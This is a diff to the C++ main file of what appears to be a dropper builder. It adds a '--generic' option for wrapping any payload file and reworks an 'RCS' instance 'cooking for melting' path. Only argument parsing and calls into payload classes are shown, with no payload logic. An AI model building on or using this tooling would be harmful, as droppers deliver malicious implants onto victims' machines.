@@ -13,14 +13,16 @@ namespace po = boost::program_options;
 
 #include "DropperCode.h"
 #include "Components.h"
-#include "Cooker.h"
-#include "RCS.h"
+#include "RCSPayload.h"
+#include "GenericPayload.h"
+#include "RCSConfig.h"
 
 std::string productName;
 std::string productVersion;
 
-int cook(bf::path rcs_directory, bf::path components_directory, bf::path output_directory);
-bool buildStub(RCS& ini);
+int rcs_cook(bf::path rcs_directory, bf::path output_directory);
+int generic_cook(bf::path payload_path, bf::path output_directory);
+bool buildStub(RCSConfig& ini);
 bool printProductVersion();
 bool findProductVersion();
 
@@ -29,9 +31,10 @@ int main(int argc, char* argv[])
 	po::options_description desc("Allowed options");
 	desc.add_options()
 		("help", "this help message")
+		("generic,G", po::value< string >(), "prepare a custom payload dropper")
 		("cook,C", "prepare RCS instance for melting")
 		("rcs,R", po::value< string >(), "RCS directory")
-		("dropper,d", po::value< string >()->default_value("components"), "dropper components directory")
+		// ("dropper,d", po::value< string >()->default_value("components"), "dropper components directory")
 		("ofile,O", po::value< string >()->default_value("cooked"), "output file")
 		("version,V", "product version")
 		;
@@ -46,13 +49,31 @@ int main(int argc, char* argv[])
 		printProductVersion();
 		return 0;
 	}
-
+	
 	if (vm.count("help")) {
 		cout << endl;
 		printProductVersion();
 		cout << endl;
 		cout << desc << endl;
 		return 0;
+	}
+	
+	bf::path output_filepath = vm["ofile"].as<string>();
+	
+	if (vm.count("generic")) {
+		bf::path payload_directory = vm["generic"].as< string >();
+		cout << "Generic payload	  : \"" << payload_directory << "\"" << endl;
+		
+		int ret = 1;
+		try {
+			ret = generic_cook(payload_directory, output_filepath);
+		} catch (std::exception &e) {
+			cout << "Cannot cook generic payload \"" << payload_directory << "\": " << e.what() << endl;
+			bf::remove(output_filepath);
+			return 1;
+		}
+		
+		return ret;
 	}
 	
 	if (vm.count("cook")) {
@@ -62,16 +83,13 @@ int main(int argc, char* argv[])
 		}
 		
 		bf::path rcs_directory = vm["rcs"].as< string >();
-		bf::path components_directory = vm["dropper"].as<string>();
-		bf::path output_filepath = vm["ofile"].as<string>();
-
+		
 		cout << "RCS directory       : \"" << rcs_directory << "\"" << endl;
-		cout << "Components directory: \"" << components_directory << "\"" << endl;
 		cout << "Output file         : \"" << output_filepath << "\"" << endl;
 		
 		int ret = 1;
 		try {
-			ret = cook(rcs_directory, components_directory, output_filepath);
+			ret = rcs_cook(rcs_directory, output_filepath);
 		} catch (std::exception &e) {
 			cout << "Cannot cook \"" << rcs_directory << "\": " << e.what() << endl;
 			bf::remove(output_filepath);
@@ -85,23 +103,43 @@ int main(int argc, char* argv[])
 	return 1;
 }
 
-int cook(bf::path rcs_directory, bf::path components_directory, bf::path output_file)
+int generic_cook(bf::path payload_path, bf::path output_file)
 {
-	if ( ! bf::exists(rcs_directory) || ! bf::is_directory(rcs_directory) ) {
+	if ( ! bf::is_regular_file(payload_path) ) {
+		cout << "Cannot find payload file \"" << payload_path << "\" or is not a regular file." << endl;
+		return 1;
+	}
+	
+	if ( bf::exists(output_file) )
+		bf::remove(output_file);
+
+	try {
+		Components components;
+		GenericPayload payload(payload_path, components);
+		payload.write( output_file );
+	} catch (std::exception& e) {
+		cout << "Error cooking: " << e.what() << endl;
+		return 1;
+	}
+	
+	return 0;
+}
+
+int rcs_cook(bf::path rcs_directory, bf::path output_file)
+{
+	if ( ! bf::is_directory(rcs_directory) ) {
 		cout << "Cannot find RCS directory \"" << rcs_directory << "\" or is not a directory." << endl;
 		return 1;
 	}
 	
-	if ( bf::exists(output_file) ) {
+	if ( bf::exists(output_file) )
 		bf::remove(output_file);
-	}
-	//bf::create_directories(output_file.parent_path());
 	
 	try {
-		RCS rcs(rcs_directory);
+		RCSConfig rcs(rcs_directory);
 		Components components;
-		Cooker cook(rcs, components);
-		cook.write( output_file ); // / bf::path(rcs.uid()).replace_extension(".cooked") );
+		RCSPayload payload(rcs, components);
+		payload.write( output_file );
 	} catch (std::exception& e) {
 		cout << "Error cooking: " << e.what() << endl;
 		return 1;
